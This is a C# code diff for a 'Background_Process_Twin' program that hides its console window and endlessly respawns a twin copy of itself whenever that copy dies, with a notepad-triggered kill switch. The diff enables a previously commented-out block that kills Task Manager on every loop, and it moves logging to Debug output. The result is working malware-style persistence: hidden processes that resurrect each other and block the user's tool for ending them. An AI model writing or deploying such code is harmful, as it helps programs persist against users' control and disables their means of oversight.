@@ -15,7 +15,7 @@ namespace Background_Process_Twins
 {
     class Background_Process_Twin
     {
-        #region Hiding console application from taskbar.
+        #region <Hiding console application from taskbar.>
         // https://social.msdn.microsoft.com/Forums/vstudio/en-US/73ba89de-bc92-44bd-81aa-462bd5ee7e46/how-to-hide-a-c-console-application-not-a-winform-app-from-taskbar?forum=windowsuidevelopment
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -27,7 +27,7 @@ namespace Background_Process_Twins
         const int SW_SHOW = 5;
         #endregion
 
-        #region Used to change app user model ID.
+        #region <Used to change app user model ID.>
         /*
         // https://stackoverflow.com/questions/48539789/pinning-to-the-taskbar-a-chained-process/58559875#58559875
         // https://stackoverflow.com/questions/34901124/how-to-group-different-apps-in-windows-task-bar
@@ -41,17 +41,18 @@ namespace Background_Process_Twins
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-            // Hide
-            ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE); // Hide
 
+            #region <Used to set AUMID.>
             /*
             // Twin applications are grouped together in the taskbar when running.
             // Setting different AUMID for every instance of the program that launches should ideally seperate them in the taskbar.
             AppID = Guid.NewGuid().ToString();
             SetCurrentProcessExplicitAppUserModelID(AppID);
-            Console.WriteLine(AppID);
+            Debug.WriteLine(AppID);
             Thread.Sleep(5000);
             */
+            #endregion
 
             Background_Process_Twin main_program = new Background_Process_Twin();
             while (true)
@@ -60,45 +61,46 @@ namespace Background_Process_Twins
                 Thread.Sleep(1000);
                 if (main_program.check_processes() == false)
                 {
-                    Console.WriteLine("[*] Twin Process Dead [2]");
+                    Debug.WriteLine("[*] Twin Process Dead [2]");
                     main_program.execute_twin_process();
                 }
-                /*
-                // Example of practical usage (Constantly closes task manager).
+                #region Example of practical usage (Continuously closes task manager).
                 try
                 {
                     Process[] proc = Process.GetProcessesByName("Taskmgr");
-                    Console.WriteLine(proc[0]);
-                    proc[0].Kill();
+                    if (proc.Length >= 1)
+                    {
+                        Debug.WriteLine(proc[0]);
+                        Debug.WriteLine("[*] Task Manager Killed");
+                        proc[0].Kill();
+                    }
                 }
                 catch(Exception ex)
                 {
-                    Console.WriteLine(ex);
+                    Debug.WriteLine(ex);
                 }
-                */
+                #endregion
             }
         }
         // Currently polling. (Bad).
-        public bool check_processes()
+        private bool check_processes()
         {
             Process[] allProcesses = Process.GetProcesses();
             bool process_alive = false;
-            int counter = 0;
-            int kill_switch_counter = 0;
-            Console.WriteLine("=================================================================================");
+            int counter = 0, kill_switch_counter = 0;
+            Debug.WriteLine("=================================================================================");
             for (int i = 0; i <= allProcesses.Length - 1; i++)
             {
                 if (allProcesses[i].ToString().Contains("Background_Process_Twin"))
                 {
-                    Console.WriteLine(allProcesses[i].ToString().Substring(27));
-                    Console.WriteLine("[*] Twin Process Is Alive");
+                    Debug.WriteLine(allProcesses[i].ToString().Substring(27));
+                    Debug.WriteLine("[*] Twin Process Is Alive");
                     counter++;
                 }
                 else if (allProcesses[i].ToString().Contains("notepad"))
                 {
                     // If two or more notepad processes are found, kill switch is activated.
-                    Console.WriteLine("[*] Notepad Found");
-                    Console.WriteLine(kill_switch_counter);
+                    Debug.WriteLine("[*] Notepad Found. Counter: " + kill_switch_counter);
                     kill_switch_counter++;
                     if (kill_switch_counter >= 2)
                     {
@@ -115,11 +117,11 @@ namespace Background_Process_Twins
         // Need to seperate both processes and treat them as seperate applications.
         // Remove the cause for child processes.
         // https://stackoverflow.com/questions/8434379/start-new-process-without-being-a-child-of-the-spawning-process
-        public void execute_twin_process()
+        private void execute_twin_process()
         {
             Process process = new Process();
             string exe_location = Directory.GetCurrentDirectory() + @"\Background_Process_Twin.exe";
-            Console.WriteLine(exe_location);
+            Debug.WriteLine(exe_location);
             process.StartInfo.FileName = exe_location;
             /*
             process.StartInfo.FileName = @"cmd";
@@ -131,11 +133,11 @@ namespace Background_Process_Twins
             // Treats app as background process (Hidden from taskbar).
             //process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             process.Start();
-            Console.WriteLine("[+] Twin Process Executed");
+            Debug.WriteLine("[+] Twin Process Executed");
         }
         private void kill_switch()
         {
-            Console.WriteLine("[+] Kill Switch Activated");
+            Debug.WriteLine("[+] Kill Switch Activated");
             System.Environment.Exit(0);
         }
     }
